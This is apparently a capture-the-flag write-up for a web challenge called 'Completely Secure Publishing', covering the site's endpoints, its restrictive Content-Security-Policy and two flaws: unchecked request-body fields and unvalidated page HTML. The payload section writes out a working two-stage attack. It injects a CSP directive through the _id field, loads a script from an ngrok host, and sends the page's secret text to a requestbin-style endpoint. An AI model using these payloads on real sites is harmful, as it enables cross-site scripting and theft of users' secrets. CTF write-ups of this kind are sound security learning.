# Completely Secure Publishing
### Author: anli

This publishing site is running a writing competition! Can you win the flag?
https://objects.bcactf.com/bcactf2/csp/server.js
http://webp.bcactf.com:49154/

## Notes

- Usage: Create and publish user controlled pages, which can be previewed, and
  then submitted to judges.
- Endpoints:
  - POST /visit
    Bot sets cookie to secret value and visits our page for 3s
  - POST /publish
    Inserts record into the DB, no validations
  - POST /report-csp-violation
    Increments CSP violations and cspChars accordingly
  - GET /page/:id
    Renders user controlled page as HTML, rendering the prize if we set the
    cookie "secret" to the right value.
    Sets CSP to `child-src 'none'; connect-src 'none'; default-src 'none';
    font-src 'none'; frame-src 'none'; img-src 'none'; manifest-src 'none';
    media-src 'none'; object-src 'none'; prefetch-src 'none'; script-src
    'report-sample'; style-src 'report-sample'; worker-src 'none'; report-uri
    /report-csp-violation?id=${req.params.id}`

- Vulns
  - Partial DB write ability through `...req.body` on LN14
  - No HTML validation on page body HTML content

- **Action Plan**
  - [DONE] Create custom page using CSP injection of `_id` to allow for XSS
  - Use XSS to exfil the flag/secret from the page

## Payloads
### Stage 1
- make sure to use %20 in URL for spaces for visiting it manually)
- Stage 2 hosted locally with `python2 -m SimpleHTTPServer` and ngrok
```
POST /pubilsh
{ "_id": "tpurpX; script-src-elem *", "title":"TPurp", "content":"<script src='http://7a795cc29696.ngrok.io/stage2.js'></script>" }
{
```

### Stage 2
Exfill site via requestbin.com
```
document.addEventListener("DOMContentLoaded", function() {
  var script = document.createElement('script');
  var payload = document.querySelector('p').innerText;
  script.src = 'https://enpvax575bdmd.x.pipedream.net/' + encodeURIComponent(payload)  + '.js'
  document.body.appendChild(script);
});
```
